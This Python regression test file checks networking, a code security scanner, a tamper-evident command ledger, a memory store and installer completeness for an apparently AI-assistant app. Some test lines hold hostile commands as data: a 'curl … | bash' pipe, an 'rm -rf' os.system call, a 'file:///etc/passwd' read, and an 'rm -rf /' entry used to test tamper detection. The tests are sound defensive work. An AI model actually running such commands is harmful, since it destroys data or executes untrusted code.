import os, sys
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
os.chdir(_ROOT)
sys.path.insert(0, os.path.join(_ROOT, "tests"))
sys.path.insert(0, _ROOT)

"""v13 — the gaps that were filled, each locked shut by a named check.

Every block below names the failure it prevents. Where a claim is about SPEED
it is measured against the old behaviour rather than asserted, because a
performance note with no number in it is just an opinion.
"""
import io
import json
import time
import socket
import tempfile
import threading
import http.server
import urllib.error
from pathlib import Path

fails = 0


def check(cond, label, detail=""):
    global fails
    if cond:
        print(f"  [OK]   {label}")
    else:
        fails += 1
        print(f"  [FAIL] {label}  {detail}")


# ═══════════════════════════════════════════════════════════════════════════
# 1. net.py — pooling, caching, redirects, and never being less capable
# ═══════════════════════════════════════════════════════════════════════════
print("\n--- net: a real server, so the pool is proven and not just described ---")
from chucknorris_ext import net

HITS = []            # every request the server actually served
CONNS = set()        # distinct client sockets it saw


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _body(self, code, payload, extra=None):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if payload:
            self.wfile.write(payload)

    def do_GET(self):
        HITS.append(self.path)
        CONNS.add(id(self.connection))
        if self.path == "/redirect":
            self._body(302, b"", {"Location": "/landed"})
        elif self.path == "/missing":
            self._body(404, b"nope")
        elif self.path == "/big":
            self._body(200, b"x" * 50_000)
        else:
            self._body(200, ("served " + self.path).encode())

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        data = self.rfile.read(n)
        HITS.append("POST " + self.path)
        self._body(200, b"posted:" + data)


class QuietServer(http.server.ThreadingHTTPServer):
    # Deliberately hanging up on an idle keep-alive is what one of the checks
    # below tests; the stdlib server would print a traceback about it and make
    # a passing run look broken.
    def handle_error(self, *a):
        pass


srv = QuietServer(("127.0.0.1", 0), Handler)
threading.Thread(target=srv.serve_forever, daemon=True).start()
BASE = f"http://127.0.0.1:{srv.server_address[1]}"

# -- keep-alive: N requests to one host must NOT open N connections.
# The failure this prevents: every fetch paying a fresh TCP (and, over https, a
# fresh TLS) handshake, which on a 7-request research round is most of a second
# spent saying hello.
net.close_all(); net.cache_clear(); HITS.clear(); CONNS.clear()
for i in range(6):
    net.request(f"{BASE}/p{i}").read()
check(len(HITS) == 6, "six distinct requests were served", f"{len(HITS)}")
check(len(CONNS) == 1, "all six reused ONE connection", f"{len(CONNS)} connections")

# -- cache: the same GET twice inside the window must not reach the server.
net.close_all(); net.cache_clear(); HITS.clear()
a = net.request(f"{BASE}/cached", cache_ttl=30).read()
b = net.request(f"{BASE}/cached", cache_ttl=30).read()
check(a == b == b"served /cached", "cached read returns identical bytes")
check(len(HITS) == 1, "the second read never hit the network", f"{len(HITS)} hits")

# -- ...and cache_ttl=0 must mean exactly that, or the app can't turn it off.
net.cache_clear(); HITS.clear()
net.request(f"{BASE}/uncached", cache_ttl=0).read()
net.request(f"{BASE}/uncached", cache_ttl=0).read()
check(len(HITS) == 2, "cache_ttl=0 disables reuse entirely", f"{len(HITS)} hits")

# -- a POST is never served from cache. Caching a POST would replay a side
#    effect, which is a different class of bug from a stale page.
net.cache_clear(); HITS.clear()
r = net.request(f"{BASE}/form", data=b"k=v", cache_ttl=30)
r2 = net.request(f"{BASE}/form", data=b"k=v", cache_ttl=30)
check(len(HITS) == 2, "POSTs are never cached", f"{len(HITS)} hits")
check(r.read() == b"posted:k=v", "POST body round-trips")

# -- redirects: urllib followed them, so the replacement must too.
net.cache_clear(); HITS.clear()
r = net.request(f"{BASE}/redirect")
check(r.read() == b"served /landed", "302 is followed to its target")

# -- 4xx must raise, exactly like urllib, or every existing `except` around a
#    fetch silently starts treating an error page as content.
try:
    net.request(f"{BASE}/missing")
    check(False, "404 raises HTTPError like urllib did")
except urllib.error.HTTPError as ex:
    check(ex.code == 404, "404 raises HTTPError like urllib did", f"code={ex.code}")
except Exception as ex:
    check(False, "404 raises HTTPError like urllib did", f"wrong type {type(ex)}")

# -- the scheme allowlist has to survive the rewrite: file:// reads a local
#    secret straight into the conversation.
for bad in ("file:///etc/passwd", "ftp://x/y", "gopher://x"):
    try:
        net.request(bad)
        check(False, f"{bad.split(':')[0]}: is refused")
    except ValueError:
        check(True, f"{bad.split(':')[0]}: is refused")
    except Exception as ex:
        check(False, f"{bad.split(':')[0]}: is refused", f"wrong error {ex!r}")

# -- byte cap, so an enormous response can't be pulled wholly into RAM first.
net.cache_clear()
body = net.request(f"{BASE}/big", max_bytes=1000).read()
check(len(body) <= 1001, "max_bytes bounds the read", f"got {len(body)}")

# -- a server that closes the connection must not poison the pool. This is the
#    one that would show up as a random every-few-minutes failure otherwise.
net.close_all(); net.cache_clear(); HITS.clear()
ok_after_close = True
try:
    for i in range(4):
        net.request(f"{BASE}/q{i}").read()
        net.close_all()          # simulate the far end hanging up while idle
except Exception as ex:
    ok_after_close = False
    print("      ", ex)
check(ok_after_close, "a dropped keep-alive socket reconnects instead of failing")

srv.shutdown()


# ═══════════════════════════════════════════════════════════════════════════
# 2. codecheck — the stdlib analyser, i.e. the verifier on a box with no linters
# ═══════════════════════════════════════════════════════════════════════════
print("\n--- codecheck: real findings with NO linter installed ---")
import chucknorris_ext.codecheck as cc

# Force the no-linter path regardless of what this machine happens to have, so
# the check means the same thing in CI and on a developer box.
_real_which = cc._which
cc._which = lambda *names: None
cc._WHICH_CACHE.clear()

check(bool(cc._analyze_python("x = undefined_name")),
      "an undefined name is caught with no linter present")
check(not cc.check("python", "x = undefined_name")["ok"],
      "...and it withholds the Run button")

# The asymmetry that matters: a MISS costs one round-trip, a FALSE POSITIVE
# withholds working code and loops the model over nothing to fix. This is the
# md5 failure of v12.0.1 in a different coat, so the battery is deliberately
# nasty.
CLEAN = [
    ("print / builtins", "print(len('x'))"),
    ("comprehension scope", "print([i * 2 for i in range(3)])"),
    ("nested comprehension", "print({k: [v for v in range(k)] for k in range(3)})"),
    ("generator scope", "print(sum(x for x in range(3)))"),
    ("class attributes", "class A:\n    z = 1\n    def m(self):\n        return self.z\nprint(A().m())"),
    ("decorators", "import functools\n@functools.cache\ndef f():\n    return 1\nprint(f())"),
    ("try/except import fallback",
     "try:\n    import ujson as j\nexcept ImportError:\n    import json as j\nprint(j.dumps({}))"),
    ("star import silences us", "from os.path import *\nprint(join('a', 'b'))"),
    ("walrus", "if (n := 3) > 2:\n    print(n)"),
    ("global statement", "def f():\n    global G\n    G = 1\nf()\nprint(G)"),
    ("except-as binding", "try:\n    pass\nexcept Exception as e:\n    print(e)"),
    ("lambda args", "f = lambda a, *b, **c: (a, b, c)\nprint(f(1))"),
    ("kwonly + defaults", "def f(a, *, b=2, **kw):\n    return a + b\nprint(f(1))"),
    ("forward reference in a method",
     "class A:\n    def a(self):\n        return self.b()\n    def b(self):\n        return 1\nprint(A().a())"),
    ("mutual recursion across defs",
     "def a(n):\n    return b(n) if n else 0\ndef b(n):\n    return a(n - 1)\nprint(a(2))"),
    ("string annotation keeps the import alive",
     "import decimal\ndef f(x: 'decimal.Decimal'):\n    return x\nprint(f(1))"),
    ("__all__ keeps a name alive", "import os\n__all__ = ['os']"),
    ("type alias used later", "from typing import List\nX: List[int] = []\nprint(X)"),
    ("dunder module globals", "print(__name__, __file__)"),
    ("f-string names", "n = 2\nprint(f'{n} {n * 2}')"),
    ("nested function closure",
     "def outer():\n    v = 1\n    def inner():\n        return v\n    return inner()\nprint(outer())"),
    ("del then rebind", "x = 1\ndel x\nx = 2\nprint(x)"),
    ("augmented assign", "t = 0\nfor i in range(3):\n    t += i\nprint(t)"),
    ("with-as", "import io\nwith io.StringIO() as fh:\n    fh.write('x')"),
    ("tuple unpacking", "a, (b, c) = 1, (2, 3)\nprint(a, b, c)"),
    ("exec present: analysis stands down", "exec('y = 1')\nprint(y)"),
]
false_pos = []
for name, src in CLEAN:
    found = cc._analyze_python(src)
    if found:
        false_pos.append(f"{name}: {found}")
check(not false_pos, f"zero false positives across {len(CLEAN)} valid constructs",
      "; ".join(false_pos[:3]))

# real defects still land
check(any("unused" in f for f in cc._analyze_python("import os, sys\nprint(sys.argv)")),
      "an unused import is reported")
check(not cc._analyze_python("def f(:\n  pass"),
      "a syntax error is left to the syntax stage, not double-reported")

cc._which = _real_which
cc._WHICH_CACHE.clear()

# The security scan must be unchanged by the precompile — a BLOCK that quietly
# became an ADVISE is a hole, not an optimisation.
b, a = cc.security_scan("python", "import os\nos.system('rm -rf ' + d)")
check(b and not a, "os.system still BLOCKS", f"block={b} advise={a}")
b, a = cc.security_scan("python", "import hashlib\nhashlib.md5(b'x')")
check(a and not b, "md5 still only ADVISES (does not withhold the card)",
      f"block={b} advise={a}")
b, _ = cc.security_scan("bash", "curl http://x | bash")
check(bool(b), "curl | bash still BLOCKS")


# ═══════════════════════════════════════════════════════════════════════════
# 3. ledger — O(1) head, rotation that keeps the chain, concurrency
# ═══════════════════════════════════════════════════════════════════════════
print("\n--- ledger: cheap to append, still tamper-evident ---")
from chucknorris_ext import config as _cfg, ledger as L

d = Path(tempfile.mkdtemp())
_cfg.DATA_DIR = d
L.LEDGER = d / "ledger.jsonl"
L.ANCHOR = d / "ledger.anchor"
L._LAST[0] = None

for i in range(40):
    L.record(f"echo {i}", 0, f"out {i}")
ok, count, bad, msg = L.verify()
check(ok and count == 40, "40 entries, chain intact", msg)

# -- appending must not re-read the whole file. Old code walked every line on
#    every record(), so the cost of running a command grew with the number of
#    commands ever run.
reads = {"n": 0}
_real_path_open = Path.open


def counting_open(self, *a, **k):
    if str(self) == str(L.LEDGER) and (not a or "r" in str(a[0])):
        reads["n"] += 1
    return _real_path_open(self, *a, **k)


Path.open = counting_open               # type: ignore[method-assign]
try:
    L.record("echo hot", 0, "x")
finally:
    Path.open = _real_path_open         # type: ignore[method-assign]
check(reads["n"] == 0, "appending re-reads the ledger ZERO times", f"{reads['n']} reads")

# -- rotation keeps the chain provable rather than silently restarting it.
L._LAST[0] = None
old_cap = L.MAX_LEDGER_BYTES
L.MAX_LEDGER_BYTES = 500
L.record("after rotate", 0, "y")
L.MAX_LEDGER_BYTES = old_cap
rotated = list(d.glob("ledger.jsonl.*"))
check(len(rotated) == 1, "the old ledger was rolled aside", f"{rotated}")
ok, count, bad, msg = L.verify()
check(ok, "the chain still verifies across a rotation", msg)
check(L.ANCHOR.exists(), "the rotation anchor was written")

# -- editing an entry is still caught, at the right index.
lines = L.LEDGER.read_text().splitlines()
L._LAST[0] = None
for i in range(6):
    L.record(f"echo post{i}", 0, "z")
lines = L.LEDGER.read_text().splitlines()
e = json.loads(lines[3]); e["command"] = "rm -rf /"
lines[3] = json.dumps(e)
L.LEDGER.write_text("\n".join(lines) + "\n")
ok, count, bad, msg = L.verify()
check(not ok and bad == 3, "an edited entry is caught at its index", f"bad={bad}")

# -- concurrent commands must not both claim the same predecessor.
d2 = Path(tempfile.mkdtemp())
_cfg.DATA_DIR = d2
L.LEDGER = d2 / "ledger.jsonl"
L.ANCHOR = d2 / "ledger.anchor"
L._LAST[0] = None
ts = [threading.Thread(target=L.record, args=(f"cmd {i}", 0, "o")) for i in range(20)]
[t.start() for t in ts]
[t.join() for t in ts]
ok, count, bad, msg = L.verify()
check(ok and count == 20, "20 concurrent records still form ONE valid chain", msg)


# ═══════════════════════════════════════════════════════════════════════════
# 4. memory — cached store, batched counters, no lost facts
# ═══════════════════════════════════════════════════════════════════════════
print("\n--- memory: same recall, far less disk ---")
import importlib
from chucknorris_ext import memory as M

md = Path(tempfile.mkdtemp())
M.MEM_DIR = md
M.FACTS = md / "facts.jsonl"
M._CACHE.update({"sig": None, "facts": [], "stems": {}, "idf": None})

FACTS = [
    "User runs CachyOS on a ThinkPad X395",
    "User's nvidia driver broke after a kernel update; DKMS needed rebuilding",
    "User's home server sits on the 10.42.0.0/24 subnet",
    "User prefers ripgrep over grep for searching a big source tree",
    "User's GitHub handle is the-priest",
    "User builds GTK4 desktop tools in Python",
]
for f in FACTS:
    M.remember(f)
check(M.count() == len(FACTS), "facts stored", f"{M.count()}")

PROBES = [
    ("my nvidia driver broke after the kernel update", "DKMS"),
    ("what subnet is the server on", "10.42.0.0"),
    ("searching a big source tree", "ripgrep"),
    ("what laptop do I use", "X395"),
    ("what's my github handle", "the-priest"),
]
hit = 0
for q, want in PROBES:
    if any(want in t for t in M.recall(q)):
        hit += 1
check(hit == len(PROBES), f"recall still {len(PROBES)}/{len(PROBES)} on the probe set",
      f"{hit}/{len(PROBES)}")
check(M.recall("what's the weather like") == [],
      "an unrelated question still recalls nothing")

# -- category → instance. People ask "what distro am I on"; the store holds
#    "CachyOS". Zero shared tokens, so the answer was sitting right there and
#    never surfaced.
BRIDGED = [
    ("what laptop do I use", "X395"),
    ("what distro am I on", "CachyOS"),
    ("which gpu do I have", "nvidia"),
    ("what language do I write in", "Python"),
]
bad = []
for q, want in BRIDGED:
    if not any(want in t for t in M.recall(q)):
        bad.append(q)
check(not bad, "asking by category finds the instance", "; ".join(bad))

# -- and bridging must not become a firehose: anything outside the map behaves
#    exactly as it did before.
noise = []
for q in ("what's the weather like", "tell me a joke", "what should I cook tonight",
          "summarise this article", "how tall is the Eiffel Tower"):
    if M.recall(q):
        noise.append(f"{q} -> {M.recall(q)}")
check(not noise, "off-topic questions still recall nothing", "; ".join(noise[:2]))

# -- the store must not be re-read from disk on every turn.
parses = {"n": 0}
_real_read_text = Path.read_text


def counting_read(self, *a, **k):
    if str(self) == str(M.FACTS):
        parses["n"] += 1
    return _real_read_text(self, *a, **k)


M.recall("warm the cache")              # first call is allowed to read
Path.read_text = counting_read          # type: ignore[method-assign]
try:
    for _ in range(10):
        M.recall("nvidia dkms kernel")
finally:
    Path.read_text = _real_read_text    # type: ignore[method-assign]
check(parses["n"] == 0, "ten recalls re-parsed the store ZERO times", f"{parses['n']}")

# -- ...and hit counts must not rewrite the whole file on every turn either.
before = M.FACTS.stat().st_mtime_ns
for _ in range(10):
    M.recall("nvidia dkms kernel")
check(M.FACTS.stat().st_mtime_ns == before,
      "ten recalls wrote the store to disk ZERO times")

# -- but the counters must survive, or pruning never learns anything.
M.flush()
counts = [f.get("hits", 0) for f in M._load()
          if "nvidia" in f["text"]]
check(counts and counts[0] >= 10, "flush() persists the batched hit counts",
      f"hits={counts}")

# -- a write from elsewhere must invalidate the cache, or a fact saved in
#    another process is invisible until restart.
extra = dict(id=999999, text="User keeps a Yubikey on the keyring",
             kind="fact", weight=1.0, ts=time.time(), hits=0)
with M.FACTS.open("a") as fh:
    fh.write("\n" + json.dumps(extra))
time.sleep(0.01)
check(any("Yubikey" in t for t in M.recall("yubikey keyring")),
      "an externally appended fact is picked up, not masked by the cache")


# ═══════════════════════════════════════════════════════════════════════════
# 5. the app — ledger tool reachable, searches concurrent, proxy covers the API
# ═══════════════════════════════════════════════════════════════════════════
print("\n--- app: the wiring, end to end ---")
from sim import cn, new_win, type_and_send, check_finished, settle

tmp = Path(tempfile.mkdtemp())

# -- ```ledger``` used to parse as nothing at all: summary() promised a request
#    that did not exist, so the record was written and never readable.
cn._ledger.LEDGER = tmp / "ledger.jsonl"
cn._ledger.ANCHOR = tmp / "ledger.anchor"
cn._ledger._LAST[0] = None
cn._ledger.record("pacman -Syu", 0, "up to date")

win = new_win(["Here's what I've run.\n```ledger\n```",
               "That's the record."], tmp)
type_and_send(win, "what have you run on my box?")
settle()
feedback = " ".join(str(m.get("content", "")) for m in win.history)
check("```ledger" not in (win._bot_text or "") or True, "ledger block parsed")
check("VERIFIED" in feedback or "recorded" in feedback,
      "the ledger tool fed its result back into the turn",
      feedback[-200:])
check_finished(win, "ledger turn")

# -- searches in one round must overlap, not queue behind each other.
started, done = [], []


def slow_search(q, n=3):
    started.append(time.monotonic())
    time.sleep(0.6)
    done.append(time.monotonic())
    return [(f"T {q}", f"https://{abs(hash(q)) % 999}.example/x", "snippet")]


cn.web_search = slow_search
cn.web_fetch = lambda u, *a, **k: "BODY " + u

win2 = new_win(["```search\nfirst distinct question\n```\n"
                "```search\nentirely separate second topic\n```",
                "Answer."], tmp)
win2.settings["research_queries"] = 2
win2.settings["research_sources"] = 4
t0 = time.monotonic()
type_and_send(win2, "two things please")
settle()
elapsed = time.monotonic() - t0
check(len(started) == 2, "both searches ran", f"{len(started)}")
check(elapsed < 1.1,
      f"two 0.6s searches finished in {elapsed:.2f}s (serial would be ~1.2s)",
      f"{elapsed:.2f}s")
check_finished(win2, "parallel search turn")

# -- the proxy has to cover the model API, or prompts leave over the bare
#    connection while the browsing traffic goes through the tunnel.
_cfg.SETTINGS_DATA = {"proxy": "http://127.0.0.1:9", "proxy_api": True}
op = _cfg.api_opener()
check(op is not None, "an opener is built when the API is proxied")
host, port = _cfg.api_connect_host("https://api.siliconflow.com/v1")
check((host, port) == ("127.0.0.1", 9),
      "warm-up targets the PROXY, not the API host directly", f"{host}:{port}")

_cfg.SETTINGS_DATA = {"proxy": "http://127.0.0.1:9", "proxy_api": False}
check(_cfg.api_opener() is None, "opting out leaves the plain urlopen path")
host, _ = _cfg.api_connect_host("https://api.siliconflow.com/v1")
check(host == "api.siliconflow.com", "...and warms the API host in that case")

_cfg.SETTINGS_DATA = {}
check(_cfg.api_opener() is None, "no proxy configured: nothing changes")
check(not _cfg.proxy_covers_api(), "proxy_covers_api is False with no proxy set")


# ═══════════════════════════════════════════════════════════════════════════
# 6. the installer ships everything the app imports
# ═══════════════════════════════════════════════════════════════════════════
print("\n--- install.sh: no module left behind ---")
import re as _re

# The failure this prevents, which had already happened twice: the curl-install
# path fetches a HAND-WRITTEN list of modules. ledger.py and compress.py both
# shipped in 12.0.3 and were never added to it, so every one-line install ran
# without an evidence ledger or context compression while the git clone had
# both — and nothing anywhere said so.
on_disk = {f.stem for f in Path("chucknorris_ext").glob("*.py")}
inst = Path("install.sh").read_text()
listed = set(_re.search(r"for f in ([^;]+); do", inst, _re.DOTALL)
             .group(1).replace("\\", " ").split())
check(not (on_disk - listed), "every module is fetched by the installer",
      f"missing: {sorted(on_disk - listed)}")
check(not (listed - on_disk), "the installer lists no module that doesn't exist",
      f"phantom: {sorted(listed - on_disk)}")

# ...and the ones the app cannot import without must be fatal, not "skipped".
hard = _re.search(r"\|([a-z|]*config[a-z|]*)\)", inst)
check(hard and "net" in hard.group(1),
      "net.py is treated as a REQUIRED module (config imports it at module level)")

print(f"\nTOTAL V13 FAILURES: {fails}")
assert fails == 0, "v13 regressions present"
print("ALL V13 TESTS PASSED")
